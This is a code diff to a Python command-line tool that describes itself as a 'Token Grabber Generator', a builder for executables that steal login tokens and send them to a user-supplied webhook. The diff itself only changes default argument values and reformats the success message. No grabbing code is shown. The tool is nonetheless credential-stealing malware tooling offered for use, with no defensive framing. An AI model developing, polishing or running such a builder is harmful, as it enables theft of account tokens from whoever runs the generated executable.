@@ -55,8 +55,8 @@ class Builder:
 
 def getArgs():
     parser = argparse.ArgumentParser(description='Token Grabber Generator')
-    parser.add_argument('-w', '--webhook', help='Add your webhook', default='1')
-    parser.add_argument('-o', '--outfile', help='Name your Executable', default='2')    
+    parser.add_argument('-w', '--webhook', help='Add your webhook', default='')
+    parser.add_argument('-o', '--outfile', help='Name your Executable', default='')    
     return parser.parse_args()
 
 def checkOS():
@@ -93,6 +93,6 @@ else:
     try:
         print("\n[+] Generating Token Grabber, please wait...")
         Builder(webhook, out_file, OS).build()
-        print("\n[+] Succesfully Generated Token Grabber\nYou can find it inside the dist directory")
+        print("\n\n[+] Succesfully Generated Token Grabber\n[+]You can find it inside the dist directory")
     except Exception as e:
         print(f"\n[-] An ERROR has occurred:\n{e}")
